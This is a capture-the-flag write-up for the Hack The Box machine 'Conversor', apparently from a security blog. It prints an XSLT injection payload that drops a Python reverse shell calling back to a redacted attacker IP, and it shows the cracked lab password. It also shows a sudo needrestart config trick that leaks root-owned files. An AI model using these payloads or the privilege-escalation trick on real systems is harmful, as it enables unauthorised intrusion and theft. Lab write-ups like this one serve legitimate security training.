---
layout: post
title: "[HTB] Conversor"
description: "Conversor is an Easy Linux machine featuring a file format converter that processes XSLT files. An XSLT injection vulnerability allows writing arbitrary files to the web root, used to drop a Python reverse shell as www-data. Post-exploitation reveals a SQLite database with a crackable password hash for lateral movement to a local user. Privilege escalation abuses needrestart 3.7 running as sudo, which evaluates its config file as Perl, leaking the root flag by passing the root.txt directly as the config."
background: /img/bg-machine.jpg
tags: [htb]
difficulty: Easy
---
![](/img/htb_img/Conversor_img/img1.png)

- OS: Linux
- Release Date: 25 Oct 2025
- Difficulty: Easy

# Enumeration
## Nmap recon
```
❯ sudo nmap -p- --min-rate 5000 --open -sS -n -Pn -oG allports $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 11:16 CET
Nmap scan report for 10.129.xx.xx
Host is up (0.11s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.82 seconds
```

Scripts and versions.
```
❯ nmap -p22,80 -sCV -Pn -oN targeted $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 11:18 CET
Nmap scan report for 10.129.xx.xx
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://conversor.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.36 seconds
```

We got a domain: `conversor.htb`, so we add it to our hosts file:
```
❯ echo "$target conversor.htb" | sudo tee -a /etc/hosts
10.129.xx.xx conversor.htb
```

## TCP 80: HTTP
![](/img/htb_img/Conversor_img/img2.png)
We are greeted with a Login form and an option to register a new user, let's do that.

![](/img/htb_img/Conversor_img/img3.png)
The webpage seems to be a file format conversor, and we can see a `XSLT` extension format being mentioned to convert. This could lead to some cool exploits.

### About page
On the about page we can find a button to download the full source code of the page.
![](/img/htb_img/Conversor_img/img4.png)

Let's download it and analyze the code.
![](/img/htb_img/Conversor_img/img5.png)

![](/img/htb_img/Conversor_img/img6.png)
The XSLT file is being invoked so we can try a malicious XSLT file and check if that hits.

# Foothold
## Malicious XSLT File
According to the Payload all the things webpage:
https://swisskyrepo.github.io/PayloadsAllTheThings/XSLT%20Injection/#tools

We can start off by discovering the version of XSLT, by uploading the following file:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<br />Version: <xsl:value-of select="system-property('xsl:version')" />
<br />Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br />Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
</body>
</html>
```

And we need a dummy xml file too:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<note>
	<title>Hello</title>
	<body>=)</body>
</note>
```

![](/img/htb_img/Conversor_img/img7.png)
Seems to be working just fine.
Let's get a reverse shell.

## Reverse Shell with XSLT file
We can use the route `scripts`, because it seems writeable from the source code analysis.
```
❯ cat rev.xslt
───────┬──────────────────────────────────────────────────────────────────────────
       │ File: rev.xslt
───────┼──────────────────────────────────────────────────────────────────────────
   1   │ <?xml version="1.0" encoding="UTF-8"?>
   2   │ <xsl:stylesheet
   3   │     xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
   4   │     xmlns:ptswarm="http://exslt.org/common"
   5   │     extension-element-prefixes="ptswarm"
   6   │     version="1.0">
   7   │ 
   8   │   <xsl:template match="/">
   9   │     <ptswarm:document href="/var/www/conversor.htb/scripts/rev.py" method="text">
  10   │ import socket,subprocess,os
  11   │ s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  12   │ s.connect(("10.10.xx.xx",4444))
  13   │ os.dup2(s.fileno(),0)
  14   │ os.dup2(s.fileno(),1)
  15   │ os.dup2(s.fileno(),2)
  16   │ subprocess.call(["/bin/sh", "-i"])
  17   │     </ptswarm:document>
  18   │   </xsl:template>
  19   │ 
  20   │ </xsl:stylesheet>
───────┴──────────────────────────────────────────────────────────────────────────
```

And firing up `Penelope` or any other shell handler like `netcat`:
```
❯ penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 172.18.0.1 • 172.17.0.1 • 10.10.xx.xx
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from conversor~10.129.xx.xx-Linux-x86_64 😍️ Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/conversor~10.129.xx.xx-Linux-x86_64/2025_11_01-11_56_02-753.log 📜
─────────────────────────────────────────────────────────────────
[+] Got reverse shell from conversor~10.129.xx.xx-Linux-x86_64 😍️ Assigned SessionID <2>
www-data@conversor:~$
```
We've got a shell.

# Lateral Movement
Checking the home folder we can see a user called `fismathack`:
```
www-data@conversor:~$ ls /home
fismathack
```
We need to find this user's password or change the shell to his in order to read in that directory.

## Enumeration
We can see a `users.db` in the `instance` folder:
```
www-data@conversor:~$ cd conversor.htb/
www-data@conversor:~/conversor.htb$ pwd
/var/www/conversor.htb
www-data@conversor:~/conversor.htb$ ls -lahR
.:
total 44K
drwxr-x--- 8 www-data www-data 4.0K Aug 14 21:34 .
drwxr-x--- 3 www-data www-data 4.0K Aug 15 05:19 ..
-rwxr-x--- 1 www-data www-data 4.4K Aug 14 20:50 app.py
-rwxr-x--- 1 www-data www-data   92 Jul 31 04:00 app.wsgi
drwxr-x--- 2 www-data www-data 4.0K Nov  1 10:55 instance
drwxr-x--- 2 www-data www-data 4.0K Nov  1 10:55 __pycache__
drwxr-x--- 2 www-data www-data 4.0K Nov  1 10:55 scripts
drwxr-x--- 3 www-data www-data 4.0K Oct 16 13:48 static
drwxr-x--- 2 www-data www-data 4.0K Aug 15 23:48 templates
drwxr-x--- 2 www-data www-data 4.0K Nov  1 10:55 uploads

./instance:
total 32K
drwxr-x--- 2 www-data www-data 4.0K Nov  1 10:55 .
drwxr-x--- 8 www-data www-data 4.0K Aug 14 21:34 ..
-rwxr-x--- 1 www-data www-data  24K Nov  1 10:55 users.db
```

Let's take a look.
Opening it with sqlitebrowser locally we can see the following accounts:
![](/img/htb_img/Conversor_img/img8.png)
We can take that hash and pass it to `crackstation` and maybe we can crack it.

## Fismathack credentials
![](/img/htb_img/Conversor_img/img9.png)
The password for `fismathack` is `Keepmesafeandwarm`.

## Shell as fismathack
```
❯ ssh fismathack@$target
fismathack@10.129.xx.xx's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-160-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Nov  1 11:06:09 AM UTC 2025

  System load:  0.2               Processes:             268
  Usage of /:   67.1% of 5.78GB   Users logged in:       0
  Memory usage: 9%                IPv4 address for eth0: 10.129.xx.xx
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Nov 1 11:06:19 2025 from 10.10.xx.xx
fismathack@conversor:~$
```

### User flag
```
fismathack@conversor:~$ ls
user.txt
fismathack@conversor:~$ cat user.txt 
<REDACTED>
fismathack@conversor:~$
```

# Privilege Escalation
Quickly as `fismathack`, we type `sudo -l` and get a binary that we can execute as sudo.
```
fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

## Needrestart binary
We can check this binary to get more information:
```
fismathack@conversor:~$ /usr/sbin/needrestart --help

needrestart 3.7 - Restart daemons after library updates.

Authors:
  Thomas Liske <thomas@fiasko-nw.net>

Copyright Holder:
  2013 - 2022 (C) Thomas Liske [http://fiasko-nw.net/~thomas/]

Upstream:
  https://github.com/liske/needrestart

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.

Usage:

  needrestart [-vn] [-c <cfg>] [-r <mode>] [-f <fe>] [-u <ui>] [-(b|p|o)] [-klw]

    -v		be more verbose
    -q		be quiet
    -m <mode>	set detail level
	e	(e)asy mode
	a	(a)dvanced mode
    -n		set default answer to 'no'
    -c <cfg>	config filename
    -r <mode>	set restart mode
	l	(l)ist only
	i	(i)nteractive restart
	a	(a)utomatically restart
    -b		enable batch mode
    -p          enable nagios plugin mode
    -o          enable OpenMetrics output mode, implies batch mode, cannot be used simultaneously with -p
    -f <fe>	override debconf frontend (DEBIAN_FRONTEND, debconf(7))
    -t <seconds> tolerate interpreter process start times within this value
    -u <ui>     use preferred UI package (-u ? shows available packages)

  By using the following options only the specified checks are performed:
    -k          check for obsolete kernel
    -l          check for obsolete libraries
    -w          check for obsolete CPU microcode

    --help      show this help
    --version   show version information

fismathack@conversor:~$
```
It says `needrestart 3.7 - Restart daemons after library updates.`, and with the `-c` flag we can pass it a file. We can check with a normal file to see what happens:
```
fismathack@conversor:/tmp$ echo "Hello" > test.txt

fismathack@conversor:/tmp$ /usr/sbin/needrestart -c ./test.txt 
Error parsing ./test.txt: Bareword "Hello" not allowed while "strict subs" in use at (eval 14) line 1.
```

As we can see it doesn't work but it says the content of the first thing that finds in the file, stating that it's an error.

### Root flag
We can take advantage of this behavior and just pass the root.txt file to the command and see if it gives the hash back:
```
fismathack@conversor:/tmp$ sudo /usr/sbin/needrestart -c /root/root.txt
Bareword found where operator expected at (eval 14) line 1, near "<REDACTED_FLAG>"
<...>
```

We correctly get the hash and finish up this machine.
